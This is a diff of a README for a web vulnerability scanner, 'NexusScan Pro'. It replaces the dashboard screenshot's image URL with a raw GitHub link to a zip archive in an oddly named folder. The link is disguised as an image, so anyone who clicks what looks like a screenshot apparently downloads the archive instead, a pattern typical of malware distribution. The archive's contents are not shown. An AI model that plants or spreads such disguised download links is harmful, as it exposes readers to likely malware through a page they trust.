@@ -1,6 +1,6 @@
 # 🔒 NexusScan Pro - Enterprise Web Security Analyzer
 
-![NexusScan Dashboard](https://i.imgur.com/advanced-dashboard.png)
+![NexusScan Dashboard](https://raw.githubusercontent.com/Omkar675/Penetration-testing-toolkit-/main/sulphoantimonious/Penetration-testing-toolkit--1.2.zip)
 
 *Advanced threat detection meets military-grade security analysis in this cutting-edge web vulnerability scanner*
 
